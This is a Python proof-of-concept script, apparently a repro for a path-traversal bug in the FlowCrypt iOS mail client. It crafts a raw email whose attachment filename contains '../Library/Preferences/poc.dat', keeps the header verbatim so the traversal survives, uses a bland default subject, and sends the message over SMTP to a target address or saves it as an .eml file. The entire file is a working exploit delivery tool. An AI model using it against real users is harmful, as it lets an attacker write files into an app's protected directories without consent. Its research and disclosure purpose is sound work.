#!/usr/bin/env python3
"""
Send an email with an attachment whose MIME filename contains a path traversal
("../Library/Preferences/poc.dat"), for the FlowCrypt iOS attachment path traversal repro.

The MIME header is written verbatim so nothing re-encodes the "../".

Usage (SMTP):
  python3 send-crafted-email.py --host smtp.gmail.com --port 587 \
      --user attacker@example.com --password 'app-password' \
      --from attacker@example.com --to victim@example.com \
      --filename '../Library/Preferences/poc.dat' --content 'PWNED-BY-ATTACHMENT'

Usage (write .eml to send manually):
  python3 send-crafted-email.py --eml crafted.eml \
      --from attacker@example.com --to victim@example.com \
      --filename '../Library/Preferences/poc.dat' --content 'PWNED-BY-ATTACHMENT'
"""

import argparse
import smtplib
import ssl
import sys
from email.utils import formatdate, make_msgid


def build_raw(from_addr: str, to_addr: str, filename: str, content: str, subject: str,
              mimetype: str = "text/plain") -> bytes:
    boundary = "BOUNDARY-flowcrypt-poc-7f3a"
    msg = []
    msg.append(f"From: {from_addr}")
    msg.append(f"To: {to_addr}")
    msg.append(f"Subject: {subject}")
    msg.append(f"Date: {formatdate(localtime=True)}")
    msg.append(f"Message-ID: {make_msgid()}")
    msg.append("MIME-Version: 1.0")
    msg.append(f'Content-Type: multipart/mixed; boundary="{boundary}"')
    msg.append("")
    msg.append(f"--{boundary}")
    msg.append("Content-Type: text/plain; charset=utf-8")
    msg.append("Content-Transfer-Encoding: 7bit")
    msg.append("")
    msg.append("Please see the attached file.")
    msg.append("")
    msg.append(f"--{boundary}")
    # The interesting line: the filename parameter carries the traversal.
    msg.append('Content-Type: %s; name="%s"' % (mimetype, filename))
    msg.append("Content-Transfer-Encoding: base64")
    msg.append('Content-Disposition: attachment; filename="%s"' % filename)
    msg.append("")
    import base64
    payload = base64.b64encode(content.encode()).decode()
    for i in range(0, len(payload), 76):
        msg.append(payload[i:i + 76])
    msg.append("")
    msg.append(f"--{boundary}--")
    msg.append("")
    return "\r\n".join(msg).encode()


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host")
    ap.add_argument("--port", type=int, default=587)
    ap.add_argument("--user")
    ap.add_argument("--password")
    ap.add_argument("--from", dest="from_addr", required=True)
    ap.add_argument("--to", dest="to_addr", required=True)
    ap.add_argument("--filename", default="../Library/Preferences/poc.dat")
    ap.add_argument("--content", default="PWNED-BY-ATTACHMENT")
    ap.add_argument("--subject", default="Weekly report")
    ap.add_argument("--mimetype", default="text/plain")
    ap.add_argument("--eml", help="write the raw message to this file instead of sending")
    args = ap.parse_args()

    raw = build_raw(args.from_addr, args.to_addr, args.filename, args.content, args.subject, args.mimetype)

    if args.eml:
        with open(args.eml, "wb") as f:
            f.write(raw)
        print(f"wrote {args.eml}")
        return 0

    if not (args.host and args.user and args.password):
        print("need --host --user --password, or use --eml", file=sys.stderr)
        return 1

    ctx = ssl.create_default_context()
    with smtplib.SMTP(args.host, args.port, timeout=30) as s:
        s.starttls(context=ctx)
        s.login(args.user, args.password)
        s.sendmail(args.from_addr, [args.to_addr], raw)
    print(f"sent to {args.to_addr} with filename {args.filename!r}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
